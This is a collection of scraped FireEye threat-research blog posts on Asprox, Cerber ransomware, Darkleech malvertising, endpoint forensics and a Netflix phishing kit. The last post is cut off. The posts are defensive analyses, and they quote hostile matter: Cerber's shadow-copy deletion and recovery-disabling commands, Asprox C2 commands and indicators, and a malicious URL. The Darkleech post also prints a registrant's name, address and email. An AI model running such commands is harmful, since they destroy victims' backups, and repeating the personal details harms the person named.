be the most successful phishing scheme theme for the campaign. The following list contains examples of email subject variations, specifically for the court notice theme: Urgent court notice Notice to Appear in Court Notice of appearance in court Warrant to appear Pretrial notice Court hearing notice Hearing of your case Mandatory court appearance The campaign appeared to increase in volume during the month of May. Figure 4 shows the increase in activity of Asprox compared to other crimewares towards the end of May specifically. Figure 5 highlights the regular monthly pattern of overall malicious emails. In comparison, Figure 6 is a compilation of all the hits from our analytics. Figure 4 Worldwide Crimeware Activity Figure 5 Overall Asprox Botnet tracking Figure 6 Asprox Botnet Activity Unique Samples These malicious email campaign spikes revealed that FireEye appliances, with the support of DTI cloud, were able to provide a full picture of the campaign (blue), while only a fraction of the emailed malware samples could be detected by various Anti-Virus vendors (yellow). Figure 7 FireEye Detection vs. Anti-Virus Detection By the end of May, we observed a big spike on the unique binaries associated with this malicious activity. Compared to the previous days where malware authors used just 10-40 unique MD5s or less per day, we saw about 6400 unique MD5s sent out on May 29 th . That is a 16,000% increase in unique MD5s over the usual malicious email campaign we’d observed. Compared to other recent email campaigns, Asprox uses a volume of unique samples for its campaign. Figure 8 Asprox Campaign Unique Sample Tracking Figure 9 Geographical Distribution of the Campaign Figure 10 Distribution of Industries Affected Brief Technical Analysis Figure 11 Attack Architecture Infiltration The infiltration phase consists of the victim receiving a phishing email with a zipped attachment containing the malware payload disguised as an Office document. Figure 11 is an example of one of the more recent phishing attempts. Figure 12 Malware Payload Icon Evasion Once the victim executes the malicious payload, it begins to start an svchost.exe process and then injects its code into the newly created process. Once loaded into memory, the injected code is then unpacked as a DLL. Notice that Asprox uses a hardcoded mutex that can be found in its strings. Typical Mutex Generation \"2GVWNQJz1\" Create svchost.exe process Code injection into svchost.exe Entrenchment Once the dll is running in memory it then creates a copy of itself in the following location: %LOCALAPPDATA%/[8 CHARACTERS].EXE Example filename: %LOCALAPPDATA%\\lwftkkea.exe It’s important to note that the process will first check itself in the startup registry key, so a compromised endpoint will have the following registry populated with the executable: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run Exfiltration/Communication The malware uses various encryption techniques to communicate with the command and control (C2) nodes. The communication uses an RSA (i.e. PROV_RSA_FULL) encrypted SSL session using the Microsoft Base Cryptographic Provider while the payloads themselves are RC4 encrypted. Each sample uses a default hardcoded public key shown below. Default Public Key -----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDCUAUdLJ1rmxx+bAndp+Cz6+5I' Kmgap2hn2df/UiVglAvvg2US9qbk65ixqw3dGN/9O9B30q5RD+xtZ6gl4ChBquqw jwxzGTVqJeexn5RHjtFR9lmJMYIwzoc/kMG8e6C/GaS2FCgY8oBpcESVyT2woV7U 00SNFZ88nyVv33z9+wIDAQAB -----END PUBLIC KEY----- First Communication Packet Bot ID RC4 Encrypted URL POST /5DBA62A2529A51B506D197253469FA745E7634B4FC HTTP/1.1 Accept: */* Content-Type: application/x-www-form-urlencoded User-Agent: <host useragent> Host: <host ip>:443 Content-Length: 319 Cache-Control: no-cache <knock><id>5DBA62A247BC1F72B98B545736DEA65A</id><group>0206s</group><src>3</src><transport>0</transport><time>1881051166</time><version>1537</version><status>0</status><debug>none<debug></knock> C2 Commands In comparison to the campaign at the end of 2013, the current campaign uses one of the newer versions of the Asprox family where threat actors added the command “ear.” if ( wcsicmp(Str1, L\"idl\") ) { if ( wcsicmp(Str1, L\"run\") ) { if ( wcsicmp(Str1, L\"rem\") ) { if ( wcsicmp(Str1, L\"ear\") { if ( wcsicmp(Str1, L\"rdl\") ) { if ( wcsicmp(Str1, L\"red\") ) { if ( !wcsicmp(Str1, L\"upd\") ) C2 commands Description idl idl This commands idles the process to wait for commands This commands idles the process to wait for commands run run Download from a partner site and execute from a specified path Download from a partner site and execute from a specified path rem rem Remove itself Remove itself ear ear Download another executable and create autorun entry Download another executable and create autorun entry rdl rdl Download, inject into svchost, and run Download, inject into svchost, and run upd upd Download and update Download and update red red Modify the registry Modify the registry C2 Campaign Characteristics For the two major malicious email campaign spikes in April and May of 2014, separate sets of C2 nodes were used for each major spike. April May-June 94.23.24.58 94.23.24.58 192.69.192.178 192.69.192.178 94.23.43.184 94.23.43.184 213.21.158.141 213.21.158.141 1.234.53.27 1.234.53.27 213.251.150.3 213.251.150.3 84.124.94.52 84.124.94.52 27.54.87.235 27.54.87.235 133.242.134.76 133.242.134.76 61.19.32.24 61.19.32.24 173.45.78.226 173.45.78.226 69.64.56.232 69.64.56.232 37.59.9.98 37.59.9.98 72.167.15.89 72.167.15.89 188.93.74.192 188.93.74.192 84.234.71.214 84.234.71.214 187.16.250.214 187.16.250.214 89.22.96.113 89.22.96.113 85.214.220.78 85.214.220.78 89.232.63.147 89.232.63.147 91.121.20.71 91.121.20.71 91.212.253.253 91.212.253.253 91.228.77.15 91.228.77.15 Conclusion The data reveals that each of the Asprox botnet’s malicious email campaigns changes its method of luring victims and C2 domains, as well as the technical details on monthly intervals. And, with each new improvement, it becomes more difficult for traditional security methods to detect certain types of malware. Acknowledgements : Nart Villeneuve, Jessa dela Torre, and David Sancho. Asprox Reborn. Trend Micro. 2013. http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-asprox-reborn.pdf Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2014/02/the-2013-fireeye-advanced-threat-report.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2014-02-27",
                    "source": "www.fireeye.com"
                },
                "text": "FireEye has just released its 2013 Advanced Threat Report (ATR), which provides a high-level overview of the computer network attacks that FireEye discovered last year. In this ATR, we focused almost exclusively on a small, but very important subset of our overall data analysis – the advanced persistent threat (APT). APTs, due to their organizational structure, mission focus, and likely some level of nation-state support, often pose a more serious danger to enterprises than a lone hacker or hacker group ever could. Over the long term, APTs are capable of cyber attacks that can rise to a strategic level, including widespread intellectual property theft, espionage, and attacks on national critical infrastructures. The data contained in this report is gleaned from the FireEye Dynamic Threat Intelligence (DTI) cloud , and is based on attack metrics shared by FireEye customers around the world. Its insight is derived from: 39,504 cyber security incidents 17,995 malware infections 4,192 APT incidents 22 million command and control (CnC) communications 159 APT-associated malware families CnC infrastructure in 206 countries and territories Based on our data, the U.S., South Korea, and Canada were the top APT targets in 2013; the U.S., Canada, and Germany were targeted by the highest number of unique malware families. The ATR describes attacks on 20+ industry verticals. Education, Finance, and High-Tech were the top overall targets, while Government, Services/Consulting, and High-Tech were targeted by the highest number of unique malware families. In 2013, FireEye discovered eleven zero-day attacks. In the first half of the year, Java was the most common target for zero-days; in the second half, FireEye observed a surge in Internet Explorer (IE) zero-days that were used in watering hole attacks, including against U.S. government websites. Last year, FireEye analyzed five times more Web-based security alerts than email-based alerts – possibly stemming from an increased awareness of spear phishing as well as a more widespread use of social media. In sum, the 2013 ATR offers strong evidence that malware infections occur within enterprises at an alarming rate, that attacker infrastructure is global in scope, and that advanced attackers continue to penetrate legacy defenses, such as firewalls and anti-virus (AV), with ease. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/05/using-real-time-events-in-investigations.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-05-14",
                    "source": "www.fireeye.com"
                },
                "text": "To understand what a threat actor did on a Windows system, analysts often turn to the tried and true sources of historical endpoint artifacts such as the Master File Table (MFT), registry hives, and Application Compatibility Cache (AppCompat). However, these evidence sources were not designed with detection or incident response in mind; crucial details may be omitted or cleared through anti-forensic methods. By looking at historical evidence alone, an analyst may not see the full story. Real-time events can be thought of as forensic artifacts specifically designed for detection and incident response, implemented through Enterprise Detection and Response (EDR) solutions or enhanced logging implementations like Sysmon . During active-attacker endpoint investigations, FireEye Mandiant has found real-time events to be useful in filling in the gaps of what an attacker did. These events record different types of system activities such as process execution, file write activity, network connections, and more. During incident response engagements, Mandiant uses FireEye Endpoint Security to track endpoint system events in real-time. This feature allows investigators to track an attacker on any system by alerting on and reviewing these real-time events. An analyst can use our solution’s built-in Audit Viewer or Redline to review real-time events. Let’s look at some examples of Windows real-time events available on our solution and how they can be leveraged during an investigation. Let’s assume the account TEST-DOMAIN\\BackupAdmin was an inactive Administrator account compromised by an attacker. Please note the examples provided in this post are based on real-time events observed during engagements but have been recreated or altered to preserve client confidentiality. Process Execution Events There are many historical process execution artifacts including AppCompat , AmCache , WMI CCM_RecentlyUsedApps , and more . A single artifact rarely covers all the useful details relating to a process's execution, but real-time process execution events change that. Our solution’s real-time process execution events record execution time, full process path, process identification number (PID), parent process path, parent PID, user, command line arguments, and even the process MD5 hash. Table 1 provides an example of a real-time process execution event recorded by our solution. Field Example Timestamp (UTC) 2020-03-10 16:40:58.235 Sequence Number 2879512 PID 9392 Process Path C:\\Windows\\Temp\\legitservice.exe Username TEST-DOMAIN\\BackupAdmin Parent PID 9103 Parent Process Path C:\\Windows\\System32\\cmd.exe EventType Start ProcessCmdLine \"C:\\Windows\\Temp\\legitservice.exe\"  -b -m Process MD5 Hash a823bc31395539816e8e4664e884550f Table 1: Example real-time process execution event Based on this real-time process execution event, the process C:\\Windows\\System32\\cmd.exe with PID 9103 executed the file C:\\Windows\\Temp\\legitservice.exe with PID 9392 and the MD5 hash a823bc31395539816e8e4664e884550f . This new process used the command line arguments -b -m under the user context of TEST-DOMAIN\\BackupAdmin . We can compare this real-time event with what an analyst might see in other process execution artifacts. Table 2 provides an example AppCompat entry for the same executed process. Note the recorded timestamp is for the last modified time of the file, not the process start time. Field Example File Last Modified (UTC) 2020-03-07 23:48:09 File Path C:\\Windows\\Temp\\legitservice.exe Executed Flag TRUE Table 2: Example AppCompat entry Table 3 provides an example AmCache entry. Note the last modified time of the registry key can usually be used to determine the process start time and this artifact includes the SHA1 hash of the file. Field Example Registry Key Last Modified (UTC) 2020-03-10 16:40:58 File Path C:\\Windows\\Temp\\legitservice.exe File Sha1 Hash 2b2e04ab822ef34969b7d04642bae47385be425c Table 3: Example AmCache entry Table 4 provides an example Windows Event Log process creation event. Note this artifact includes the PID in hexadecimal notation, details about the parent process, and even a field for where the process command line arguments should be. In this example the command line arguments are not present because they are disabled by default and Mandiant rarely sees this policy enabled by clients on investigations. Field Example Write Time (UTC) 2020-03-10 16:40:58 Log Security Source Microsoft Windows security EID 4688 Message A new process has been created. Creator Subject: Security ID:             TEST-DOMAIN\\BackupAdmin Account Name:            BackupAdmin Account Domain:          TEST-DOMAIN Logon ID:                0x6D6AD Target Subject: Security ID:             NULL SID Account Name:            - Account Domain:          - Logon ID:                0x0 Process Information: New Process ID:          0x24b0 New Process Name:        C:\\Windows\\Temp\\legitservice.exe Token Elevation Type:    %%1938 Mandatory Label:         Mandatory Label\\Medium Mandatory Level Creator Process ID:      0x238f Creator Process Name:    C:\\Windows\\System32\\cmd.exe Process Command Line: Table 4: Example Windows event log process creation event If we combine the evidence available in AmCache with a fully detailed Windows Event Log process creation event, we could match the evidence available in the real-time event except for a small difference in file hash types. File Write Events An attacker may choose to modify or delete important evidence. If an attacker uses a file shredding tool like Sysinternal’s SDelete, it is unlikely the analyst will recover the original contents of the file. Our solution’s real-time file write events are incredibly useful in situations like this because they record the MD5 hash of the files written and partial contents of the file. File write events also record which process created or modified the file in question. Table 5 provides an example of a real-time file write event recorded by our solution. Field Example Timestamp (UTC) 2020-03-10 16:42:59.956 Sequence Number 2884312 PID 9392 Process Path C:\\Windows\\Temp\\legitservice.exe Username TEST-DOMAIN\\BackupAdmin Device Path \\Device\\HarddiskVolume2 File Path C:\\Windows\\Temp\\WindowsServiceNT.log File MD5 Hash 30a82a8a864b6407baf9955822ded8f9 Num Bytes Seen Written 8 Size 658 Writes 4 Event reason File closed Closed TRUE Base64 Encoded Data At Lowest Offset Q3JlYXRpbmcgJ1dpbmRvd3NTZXJ2aWNlTlQubG9nJy Bsb2dmaWxlIDogT0sNCm1pbWlrYXR6KGNvbW1hbmQ Text At Lowest Offset Creating 'WindowsServiceNT.log' logfile : OK....mimikatz(command Table 5: Example real-time file write event Based on this real-time file write event, the malicious executable C:\\Windows\\Temp\\legitservice.exe wrote the file C:\\Windows\\Temp\\WindowsServiceNT.log to disk with the MD5 hash 30a82a8a864b6407baf9955822ded8f9 . Since the real-time event recorded the beginning of the written file, we can determine the file likely contained Mimikatz credential harvester output which Mandiant has observed commonly starts with OK....mimikatz . If we investigate a little later, we’ll see a process creation event for C:\\Windows\\Temp\\taskassist.exe with the MD5 file hash 2b5cb081721b8ba454713119be062491 followed by several file write events for this process summarized in Table 6. Timestamp File Path File Size 2020-03-10 16:53:42.351 C:\\Windows\\Temp\\WindowsServiceNT.log 638 2020-03-10 16:53:42.351 C:\\Windows\\Temp\\AAAAAAAAAAAAAAAA.AAA 638 2020-03-10 16:53:42.351 C:\\Windows\\Temp\\BBBBBBBBBBBBBBBB.BBB 638 2020-03-10 16:53:42.351 C:\\Windows\\Temp\\CCCCCCCCCCCCCCCC.CCC 638 … 2020-03-10 16:53:42.382 C:\\Windows\\Temp\\XXXXXXXXXXXXXXXX.XXX 638 2020-03-10 16:53:42.382 C:\\Windows\\Temp\\YYYYYYYYYYYYYYYY.YYY 638 2020-03-10 16:53:42.382 C:\\Windows\\Temp\\ZZZZZZZZZZZZZZZZ.ZZZ 638 Table 6: Example timeline of SDelete File write events Admittedly, this activity may seem strange at a first glance. If we do some research on the its file hash, we’ll see the process is actually SDelete masquerading as C:\\Windows\\Temp\\taskassist.exe . As part of its secure deletion process, SDelete renames the file 26 times in a successive alphabetic manner. Network Events Incident responders rarely see evidence of network communication from historical evidence on an endpoint without enhanced logging. Usually, Mandiant relies on NetFlow data, network sensors with full or partial packet capture, or malware analysis to determine the command and control (C2) servers with which a malware sample can communicate. Our solution’s real-time network events record both local and remote network ports, the leveraged protocol, and the relevant process. Table 7 provides an example of a real-time IPv4 network event recorded by our solution. Field Example Timestamp (UTC) 2020-03-10 16:46:51.690 Sequence Number 2895588 PID 9392 Process + Path C:\\Windows\\Temp\\legitservice.exe Username TEST-DOMAIN\\BackupAdmin Local IP Address 10.0.0.52 Local Port 57472 Remote IP Address 10.0.0.51 Remote Port 443 Protocol TCP Table 7: Example real-time network connection event Based on this real-time IPv4 network event, the malicious executable C:\\Windows\\Temp\\legitservice.exe made an outbound TCP connection to 10.0.0.51:443 . Registry Key Events By using historical evidence to investigate relevant timeframes and commonly abused registry keys, we can identify malicious or leveraged keys. Real-time registry key events are useful for linking processes to the modified registry keys. They can also show when an attacker deletes or renames a registry key. This is useful to an analyst because the only available timestamp recorded in the registry is the last modified time of a registry key, and this timestamp is updated if a parent key is updated. Table 8 provides an example of a real-time registry key event recorded by our solution. Field Example Timestamp (UTC) 2020-03-10 16:46:56.409 Sequence Number 2898196 PID 9392 Process + Path C:\\Windows\\Temp\\legitservice.exe Username TEST-DOMAIN\\BackupAdmin Event Type 3 Path HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\ LegitWindowsService\\ImagePath Key Path CurrentControlSet\\Services\\LegitWindowsService Original Path HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\LegitWindowsService Value Name ImagePath Value Type REG_EXPAND_SZ Base64 Encoded Value QwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABsAG UAZwBpAHQAcwBlAHIAdgBpAGMAZQAuAGUAeABlAAAAAA== Text C:\\Windows\\Temp\\legitservice.exe Table 8: Example real-time registry key event For our solution's real-time registry events, we can map the event type to the operation performed using Table 9. Event Type Value Operation 1 PreSetValueKey 2 PreDeleteValueKey 3 PostCreateKey, PostCreateKeyEx, PreCreateKeyEx 4 PreDeleteKey 5 PreRenameKey Table 9: FireEye Endpoint Security real-time registry key event types Based on this real-time registry key event, the malicious executable C:\\Windows\\Temp\\legitservice.exe created the Windows service LegitWindowsService . If we investigated the surrounding registry keys, we might identify even more information about this malicious service. Conclusion The availability of real-time events designed for forensic analysis can fill in gaps that traditional forensic artifacts cannot on their own. Mandiant has seen great value in using real-time events during active-attacker investigations. We have used real-time events to determine the functionality of attacker utilities that were no longer present on disk, to determine users and source network addresses used during malicious remote desktop activity when expected corresponding event logs were missing, and more. Check out our FireEye Endpoint Security page and Redline page for more information (as well as Redline on the FireEye Market ), and take a FireEye Endpoint Security tour today. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2016/07/cerber-ransomware-attack.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2016-07-18",
                    "source": "www.fireeye.com"
                },
                "text": "Ransomware is a common method of cyber extortion for financial gain that typically involves users being unable to interact with their files, applications or systems until a ransom is paid. Accessibility of cryptocurrency such as Bitcoin has directly contributed to this ransomware model. Based on data from FireEye Dynamic Threat Intelligence (DTI), ransomware activities have been rising fairly steadily since mid-2015. On June 10, 2016, FireEye’s HX detected a Cerber ransomware campaign involving the distribution of emails with a malicious Microsoft Word document attached. If a recipient were to open the document a malicious macro would contact an attacker-controlled website to download and install the Cerber family of ransomware. Exploit Guard, a major new feature of FireEye Endpoint Security (HX) , detected the threat and alerted HX customers on infections in the field so that organizations could inhibit the deployment of Cerber ransomware. After investigating further, the FireEye research team worked with security agency CERT-Netherlands, as well as web hosting providers who unknowingly hosted the Cerber installer, and were able to shut down that instance of the Cerber command and control (C2) within hours of detecting the activity. With the attacker-controlled servers offline, macros and other malicious payloads configured to download are incapable of infecting users with ransomware. FireEye hasn’t seen any additional infections from this attacker since shutting down the C2 server, although the attacker could configure one or more additional C2 servers and resume the campaign at any time. This particular campaign was observed on six unique endpoints from three different FireEye endpoint security customers. HX has proven effective at detecting and inhibiting the success of Cerber malware. Attack Process The Cerber ransomware attack cycle we observed can be broadly broken down into eight steps: Target receives and opens a Word document. Macro in document is invoked to run PowerShell in hidden mode. Control is passed to PowerShell, which connects to a malicious site to download the ransomware. On successful connection, the ransomware is written to the disk of the victim. PowerShell executes the ransomware. The malware configures multiple concurrent persistence mechanisms by creating command processor, screensaver, startup.run and runonce registry entries. The executable uses native Windows utilities such as WMIC and/or VSSAdmin to delete backups and shadow copies. Files are encrypted and messages are presented to the user requesting payment. Rather than waiting for the payload to be downloaded or started around stage four or five of the aforementioned attack cycle, Exploit Guard provides coverage for most steps of the attack cycle – beginning in this case at the second step. The most common way to deliver ransomware is via Word documents with embedded macros or a Microsoft Office exploit. FireEye Exploit Guard detects both of these attacks at the initial stage of the attack cycle. PowerShell Abuse When the victim opens the attached Word document, the malicious macro writes a small piece of VBScript into memory and executes it. This VBScript executes PowerShell to connect to an attacker-controlled server and download the ransomware (profilest.exe), as seen in Figure 1. Figure 1. Launch sequence of Cerber – the macro is responsible for invoking PowerShell and PowerShell downloads and runs the malware It has been increasingly common for threat actors to use malicious macros to infect users because the majority of organizations permit macros to run from Internet-sourced office documents. In this case we observed the macrocode calling PowerShell to bypass execution policies – and run in hidden as well as encrypted mode – with the intention that PowerShell would download the ransomware and execute it without the knowledge of the victim. Further investigation of the link and executable showed that every few seconds the malware hash changed with a more current compilation timestamp and different appended data bytes – a technique often used to evade hash-based detection. Cerber in Action Initial payload behavior Upon execution, the Cerber malware will check to see where it is being launched from. Unless it is being launched from a specific location (%APPDATA%\\&#60GUID&#62), it creates a copy of itself in the victim's %APPDATA% folder under a filename chosen randomly and obtained from the %WINDIR%\\system32 folder. If the malware is launched from the specific aforementioned folder and after eliminating any blacklisted filenames from an internal list, then the malware creates a renamed copy of itself to “%APPDATA%\\&#60GUID&#62” using a pseudo-randomly selected name from the “system32” directory. The malware executes the malware from the new location and then cleans up after itself. Shadow deletion As with many other ransomware families, Cerber will bypass UAC checks, delete any volume shadow copies and disable safe boot options. Cerber accomplished this by launching the following processes using respective arguments: Vssadmin.exe \"delete shadows /all /quiet\" WMIC.exe \"shadowcopy delete\" Bcdedit.exe \"/set {default} recoveryenabled no\" Bcdedit.exe \"/set {default} bootstatuspolicy ignoreallfailures Coercion People may wonder why victims pay the ransom to the threat actors. In some cases it is as simple as needing to get files back, but in other instances a victim may feel coerced or even intimidated. We noticed these tactics being used in this campaign, where the victim is shown the message in Figure 2 upon being infected with Cerber. Figure 2. A message to the victim after encryption The ransomware authors attempt to incentivize the victim into paying quickly by providing a 50 percent discount if the ransom is paid within a certain timeframe, as seen in Figure 3. Figure 3. Ransom offered to victim, which is discounted for five days Multilingual Support As seen in Figure 4, the Cerber ransomware presented its message and instructions in 12 different languages, indicating this attack was on a global scale. Figure 4.   Interface provided to the victim to pay ransom supports 12 languages Encryption Cerber targets 294 different file extensions for encryption, including .doc (typically Microsoft Word documents), .ppt (generally Microsoft PowerPoint slideshows), .jpg and other images. It also targets financial file formats such as. ibank (used with certain personal finance management software) and .wallet (used for Bitcoin). Selective Targeting Selective targeting was used in this campaign. The attackers were observed checking the country code of a host machine’s public IP address against a list of blacklisted countries in the JSON configuration, utilizing online services such as ipinfo.io to verify the information. Blacklisted (protected) countries include: Armenia, Azerbaijan, Belarus, Georgia, Kyrgyzstan, Kazakhstan, Moldova, Russia, Turkmenistan, Tajikistan, Ukraine, and Uzbekistan . The attack also checked a system's keyboard layout to further ensure it avoided infecting machines in the attackers geography: 1049—Russian, ¨ 1058—Ukrainian, 1059—Belarusian, 1064—Tajik, 1067—Armenian, 1068—Azeri, (Latin), 1079—Georgian, 1087—Kazakh, 1088—Kyrgyz (Cyrillic), 1090—Turkmen, 1091—Uzbek (Latin), 2072—Romanian (Moldova), 2073—Russian (Moldova), 2092—Azeri (Cyrillic), 2115—Uzbek (Cyrillic). Selective targeting has historically been used to keep malware from infecting endpoints within the author’s geographical region, thus protecting them from the wrath of local authorities. The actor also controls their exposure using this technique. In this case, there is reason to suspect the attackers are based in Russia or the surrounding region. Anti VM Checks The malware searches for a series of hooked modules, specific filenames and paths, and known sandbox volume serial numbers, including: sbiedll.dll, dir_watch.dll, api_log.dll, dbghelp.dll, Frz_State, C:\\popupkiller.exe, C:\\stimulator.exe, C:\\TOOLS\\execute.exe, \\sand-box\\, \\cwsandbox\\, \\sandbox\\, 0CD1A40, 6CBBC508, 774E1682, 837F873E, 8B6F64BC. Aside from the aforementioned checks and blacklisting, there is also a wait option built in where the payload will delay execution on an infected machine before it launches an encryption routine. This technique was likely implemented to further avoid detection within sandbox environments. Persistence Once executed, Cerber deploys the following persistence techniques to make sure a system remains infected: A registry key is added to launch the malware instead of the screensaver when the system becomes idle. The “CommandProcessor” Autorun keyvalue is changed to point to the Cerber payload so that the malware will be launched each time the Windows terminal, “cmd.exe”, is launched. A shortcut (.lnk) file is added to the startup folder. This file references the ransomware and Windows will execute the file immediately after the infected user logs in. Common persistence methods such as run and runonce key are also used. A Solid Defense Mitigating ransomware malware has become a high priority for affected organizations because passive security technologies such as signature-based containment have proven ineffective. Malware authors have demonstrated an ability to outpace most endpoint controls by compiling multiple variations of their malware with minor binary differences. By using alternative packers and compilers, authors are increasing the level of effort for researchers and reverse-engineers. Unfortunately, those efforts don’t scale. Disabling support for macros in documents from the Internet and increasing user awareness are two ways to reduce the likelihood of infection. If you can, consider blocking connections to websites you haven’t explicitly whitelisted. However, these controls may not be sufficient to prevent all infections or they may not be possible based on your organization. FireEye Endpoint Security with Exploit Guard helps to detect exploits and techniques used by ransomware attacks (and other threat activity) during execution and provides analysts with greater visibility. This helps your security team conduct more detailed investigations of broader categories of threats. This information enables your organization to quickly stop threats and adapt defenses as needed. Conclusion Ransomware has become an increasingly common and effective attack affecting enterprises, impacting productivity and preventing users from accessing files and data. Mitigating the threat of ransomware requires strong endpoint controls, and may include technologies that allow security personnel to quickly analyze multiple systems and correlate events to identify and respond to threats. HX with Exploit Guard uses behavioral intelligence to accelerate this process, quickly analyzing endpoints within your enterprise and alerting your team so they can conduct an investigation and scope the compromise in real-time. Traditional defenses don’t have the granular view required to do this, nor can they connect the dots of discreet individual processes that may be steps in an attack. This takes behavioral intelligence that is able to quickly analyze a wide array of processes and alert on them so analysts and security teams can conduct a complete investigation into what has, or is, transpiring. This can only be done if those professionals have the right tools and the visibility into all endpoint activity to effectively find every aspect of a threat and deal with it, all in real-time. Also, at FireEye, we go one step ahead and contact relevant authorities to bring down these types of campaigns. Click here for more information about Exploit Guard technology. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2013/10/another-darkleech-campaign.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2013-10-03",
                    "source": "www.fireeye.com"
                },
                "text": "Last week got us up close and personal with Darkleech and Blackhole with our external careers web site. The fun didn’t end there, this week we saw a tidal wave of Darkleech activity linked to a large-scale malvertising campaign identified by the following URL: hXXp://delivery[.]globalcdnnode[.]com/7f01baa99716452bda5bba0572c58be9/afr-zone.php Again Darkleech was up to its tricks, injecting URLs and sending victims to a landing page belonging to the Blackhole Exploit Kit, one of the most popular and effective exploit kits available today. Blackhole wreaks havoc on computers by exploiting vulnerabilities in client applications like IE, Java and Adobe, computers that are vulnerable to exploits launched by Blackhole are likely to become infected with one of several flavors of malware including ransomware , Zeus/Zbot variants and clickfraud trojans like ZeroAccess. We started logging hits at 21:31:00 UTC on Sunday 09/22/2013, the campaign has been ongoing, peaking Monday and tapered down through out the week. During most of the campaign’s run, delivery[.]globalcdnnode[.]com appeared to have gone dark, no longer serving the exploit kit’s landing page as expected and then stopped resolving altogether, yet tons of requests kept flowing. This left some scratching their heads as to whether the noise was a real threat. Indeed, it was a real threat, as Blackhole showed up to the party a couple of days later; this was confirmed by actually witnessing a system get attacked on a subsequent visit to the URL. Figure 1. – Session demonstrating exploit via IE browser and Java. The server returned the (obfuscated) Blackhole Landing page; no 404 this time. Figure 2 – request and response to to delivery[.]globalcdnnode[.]com. The next stage was to load a new URL for the malicious jar file. At this point, the unpatched Windows XP system running vulnerable Java quickly succumbed to CVE-2013-0422 . Figure 3 – Packet capture showing JAR file being downloaded. Figure 4. – Some of the Java class files visible in the downloaded Jar. Even though our system was exploited and the browser was left in a hung state, it did not receive the payload. Given the sporadic availability during the week of both the host and exploit kit’s landing page, it’s possible the system is or was undergoing further setup and this is the prelude to yet another large-scale campaign. We can’t say for sure but we know this is not the last time we will see it or the crimeware actor behind it. Registrant: Name: Alexey Prokopenko Organization: home Address: Lenina 4, kv 1 City: Ubileine Province/state: LUGANSKA OBL Country: UA Postal Code: 519000 Email: alex1978a @bigmir.net By the way, this actor has a long history of malicious activity online too. The campaign also appears to be abusing Amazon Web Services. globalcdnnode.com Server:           ns-293.awsdns-36.com Address:    205.251.193.37#53 globalcdnnode.com origin = ns-293.awsdns-36.com mail addr = awsdns-hostmaster.amazon.com At time of this writing, the domain delivery[.]globalcdnnode[.]com was still resolving, using fast-flux DNS techniques to resolve to a different IP address every couple minutes, thwarting attempts at shutting down the domain by constantly being on the move. Figure 5. – The familiar Plesk control panel, residing on the server. This was a widespread campaign, indirectly affecting many web sites via malvertising techniques. The referring hosts run the gamut from local radio stations to high profile news, sports, and shopping sites. Given the large amounts of web traffic these types of sites see, its not surprising there was a tidal wave of requests to delivery[.]globalcdnnode[.]com. Every time a page with the malvertisement was loaded, a request was made to hXXp://delivery.globalcdnnode.com/7f01baa99716452bda5bba0572c58be9/afr-zone.php, in the background. To give an example of what this activity looked like from DTI, you can see the numbers in the chart below. Figure 6. – DTI graph showing number of Darkleech detections logged each day. By using malvertising and or posing as a legitimate advertiser or content delivery network, the bad guys infiltrate the web advertisement ecosystem. This results in their malicious content getting loaded in your browser, often times in the background , while you browse sites that have nothing to do with the attack (as was the case in our careers site). Imagine a scenario where a good portion of enterprise users have a home page set to a popular news website . More than likely, the main web page has advertisements, and some of those ads could be served from 3 rd party advertiser networks and or CDNs. If just one of those advertisements on the page is malicious, visitors to that page are at risk of redirection and or infection, even though the news website’s server is itself clean. So, when everybody shows up to work on Monday and opens their browsers, there could be a wave of clients making requests to exploit kit landing pages, if Darkleech is lurking in those advertisement waters, you could end up with a leech or 2 attached to your network. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2017/01/credit_card_dataand.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2017-01-09",
                    "source": "www.fireeye.com"
                },
                "text": "Introduction Through FireEye’s Email Threat Prevention (ETP) solution, FireEye Labs discovered a phishing campaign in the wild targeting the credit card data and other personal information of Netflix users primarily based in the United States. This campaign is interesting because of the evasion techniques that were used by the attackers: The phishing pages were hosted on legitimate, but compromised web servers. Client-side HTML code was obfuscated with AES encryption to evade text-based detection. Phishing pages were not displayed to users from certain IP addresses if its DNS resolved to companies such as Google or PhishTank. At the time of posting, the phishing websites we observed were no longer active. Attack Flow The attack seems to start with an email notification – sent by the attackers – that asks the user to update their Netflix membership details. The phishing link inside the email body directs recipients to a page that attempts to mimic a Netflix login page, as seen in Figure 1. Figure 1: Fake login page mimicking the Netflix website Upon submitting their credentials, victims are then directed to webpages requesting additional membership details (Figure 2) and payment information (Figure 3). These websites also attempt to mimic authentic Netflix webpages and appear legitimate. Once the user has entered their information, they are taken to the legitimate Netflix homepage. Figure 2: Fake webpage asking users to update their personal details Figure 3: Netflix phishing webpage used to steal credit card information Technical Details The phishing kit uses techniques to evade phishing filters. One technique is the use of AES encryption to encode the content presented at the client’s side, as seen in Figure 4. The purpose of using this technique is code obfuscation, which helps to evade text-based detection. By obfuscating the webpage, attackers try to deceive text-based classifiers and prevent them from inspecting webpage content. This technique employs two files, a PHP and a JavaScript file that have functions to encrypt and decrypt input strings. The PHP file is used to encrypt the webpages at the server side, as seen in Figure 5. At the client side, the encrypted content is decoded using a defined function in the JavaScript file, as seen in Figure 6. Finally, the webpage is rendered using the ‘document.write’ function. Figure 4: Client-side code 